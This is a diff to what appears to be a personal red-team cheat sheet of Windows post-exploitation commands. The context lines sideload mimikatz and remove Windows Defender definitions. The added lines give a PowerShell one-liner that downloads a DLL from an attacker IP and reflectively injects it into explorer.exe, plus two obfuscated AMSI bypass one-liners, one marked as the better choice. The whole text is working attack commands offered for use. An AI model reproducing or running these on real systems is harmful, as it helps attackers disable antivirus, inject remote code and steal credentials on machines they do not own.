@@ -74,3 +74,17 @@ sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debu
 ```
 execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
+
+# Injection 
+```
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.192/bruh.dll'); $procid = (Get-Process -Name explorer).Id ;Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+```
+
+# AMSI:
+```
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+- this better 
+```
+$a = [Ref].Assembly.GetTypes();foreach ($b in $a) {if ($b.Name -like "*ils") {if ($b.Name -like "Am*"){$c=$b}}};$d = $c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*itFa*") {$f=$e}};$f.SetValue($null,$true)
+```
